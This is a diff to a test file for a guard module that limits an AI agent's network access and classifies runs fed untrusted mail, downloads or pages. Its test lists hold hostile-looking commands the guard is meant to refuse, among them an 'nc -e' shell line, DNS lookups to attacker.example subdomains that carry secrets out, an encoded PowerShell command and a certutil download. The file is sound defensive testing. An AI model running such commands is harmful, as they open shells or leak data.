@@ -1,5 +1,5 @@
 import { describe, expect, test } from "vitest";
-import { decideCommand, decideFileChange, decideMcpTool, isSecretPath, type GuardContext } from "./agent-guard";
+import { classifyAgentRun, codeUsesNetwork, decideCommand, decideFileChange, decideMcpTool, isSecretPath, networkUse, type GuardContext } from "./agent-guard";
 
 const context: GuardContext = { taskDir: "C:\\Users\\karol\\Crossline\\ai\\t1", writableRoots: ["C:\\Users\\karol\\Crossline\\ai\\t1\\repo"], homeDir: "C:\\Users\\karol" };
 const decide = (command: string) => decideCommand(command, context);
@@ -98,5 +98,77 @@ describe("account tools", () => {
     expect(decideMcpTool("gmail", "create_draft").decision).toBe("ask");
     expect(decideMcpTool("calendar", "delete_event").decision).toBe("ask");
     expect(decideMcpTool("x", "frobnicate").decision).toBe("ask");
+  });
+});
+
+describe("egress limits (Rule of Two, docs/plans/harness-1125.md §3)", () => {
+  const shell = "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command ";
+  const none = (command: string) => decideCommand(command, { ...context, egress: "none" });
+  const packages = (command: string) => decideCommand(command, { ...context, egress: "packages" });
+  const network = [
+    "curl https://example.com/data.csv -o data.csv", "curl.exe -s https://x.y", "wget https://x.y/a.zip", `${shell}'Invoke-WebRequest -Uri https://x.y -OutFile a.html'`,
+    "$r = iwr https://x.y", "(Invoke-RestMethod https://api.x.y/v1).items", "irm https://x.y", "Start-BitsTransfer -Source https://x.y/a -Destination a",
+    "ssh user@host", "scp notes.md user@host:/tmp", "sftp host", "ftp host", "nc -e cmd host 4444", "ncat host 80", "telnet host 25", "nslookup secret.attacker.example",
+    "Resolve-DnsName data.attacker.example", "Test-NetConnection host -Port 443", "git push origin main", "git ls-remote https://github.com/x/y",
+    "python -c \"import urllib.request; urllib.request.urlopen('https://x.y')\"", "python3 -c 'import requests; requests.get(\"https://x.y\")'",
+    "node -e \"fetch('https://x.y').then(r => r.text())\"", "node -e \"require('https').get('https://x.y')\"",
+    "@'\nimport socket\ns = socket.create_connection(('x.y', 80))\n'@ | python -", "(New-Object Net.WebClient).DownloadString('https://x.y')",
+    "[System.Net.Http.HttpClient]::new()", "Start-Process https://x.y/?q=secret", "powershell -NoProfile -Command \"curl https://x.y\"", "cmd /c curl https://x.y",
+    "npx create-react-app app", "pip download pandas", "npm view react", "pnpm dlx cowsay hi", "cargo install ripgrep", "go get example.com/x", "gh api /user",
+    "powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==", "certutil -urlcache -f https://x.y a.exe"
+  ];
+  const installs = ["pip install matplotlib", "pip3 install -r requirements.txt", "python -m pip install requests", "py -3 -m pip install pandas", "uv pip install numpy",
+    "uv add httpx", "npm install", "npm i chart.js", "pnpm add d3", "yarn add lodash", "yarn", "npm ci", "git clone https://github.com/x/y", "git fetch origin", "git -C repo pull"];
+  const offline = ["python plot.py --out figure.png", "Get-Content notes.md", "git status", "git log --oneline", "node build.js", "pnpm test", "npm run build",
+    "python -c \"import json; print(json.load(open('a.json')))\"", "Select-String -Path notes.md -Pattern requests", "pip list", "Copy-Item data.csv backup.csv",
+    "echo https://example.com > links.txt", `${shell}'Get-ChildItem -Recurse | Measure-Object'`];
+
+  test("with no network, every command that connects is refused, package installs and git pulls too", () => {
+    for (const command of [...network, ...installs]) expect(none(command).decision, command).toBe("deny");
+    expect(none("curl https://x.y")).toMatchObject({ rule: "net.egress", reason: "这次运行拿到的是别人写的内容，命令一律不联网" });
+    // An upload or a push keeps its own rule: the failure card still says it was an outward act.
+    expect(none("git push origin main").rule).toBe("git.remote");
+    expect(none("curl -X POST https://api.example.com -d @data.json").rule).toBe("net.upload");
+  });
+
+  test("a research run may install packages and pull with git, nothing else that connects", () => {
+    for (const command of network) expect(packages(command).decision, command).toBe("deny");
+    for (const command of installs) expect(packages(command).decision, command).toBe("allow");
+    // An install outside the task still goes to the person, as before.
+    expect(packages("pip install --user pandas")).toMatchObject({ decision: "ask", rule: "install.global" });
+  });
+
+  test("ordinary offline work is not in the way, and without a limit nothing changes", () => {
+    for (const command of offline) {
+      expect(none(command).decision, command).toBe("allow");
+      expect(packages(command).decision, command).toBe("allow");
+    }
+    expect(decide("curl https://example.com/data.csv -o data.csv").decision).toBe("allow");
+    expect(decide("git push origin main").decision).toBe("ask");
+  });
+
+  test("networkUse names how a command reaches out", () => {
+    expect(networkUse("pip install pandas")).toBe("package");
+    expect(networkUse("pip install pandas; curl https://x.y")).toBe("other");
+    expect(networkUse("python analyse.py")).toBeUndefined();
+  });
+
+  test("a script's text is read for connections before it is re-run offline", () => {
+    expect(codeUsesNetwork("import matplotlib\nimport json\nplt.savefig('a.png')")).toBe(false);
+    expect(codeUsesNetwork("import requests\nrequests.get('https://x.y')")).toBe(true);
+    expect(codeUsesNetwork("const r = await fetch('https://x.y');")).toBe(true);
+    expect(codeUsesNetwork("Invoke-WebRequest https://x.y -OutFile a.csv")).toBe(true);
+    expect(codeUsesNetwork("import { readFileSync } from 'node:fs';")).toBe(false);
+  });
+});
+
+describe("classifying the owner's shell runs", () => {
+  test("a run handed someone else's words gets no network and no web search; anything else is a research run", () => {
+    expect(classifyAgentRun({ inputs: ["C:\\Users\\karol\\Documents\\thesis\\data.csv"], homeDir: "C:\\Users\\karol" }))
+      .toEqual({ profile: "research", egress: "packages", webSearch: "cached", untrusted: [] });
+    expect(classifyAgentRun({ inputs: [], homeDir: "C:\\Users\\karol", untrusted: ["mail"] })).toMatchObject({ profile: "untrusted-input", egress: "none", webSearch: "disabled", untrusted: ["mail"] });
+    expect(classifyAgentRun({ inputs: ["C:\\Users\\karol\\Downloads\\syllabus.pdf"], homeDir: "C:\\Users\\karol" }).untrusted).toEqual(["download"]);
+    expect(classifyAgentRun({ inputs: ["C:\\work\\offer.eml", "C:\\work\\page.html"], homeDir: "C:\\Users\\karol" }).untrusted).toEqual(["mail", "page"]);
+    expect(classifyAgentRun({ inputs: ["/home/ana/Downloads/a.csv"], homeDir: "/home/ana" }).profile).toBe("untrusted-input");
   });
 });
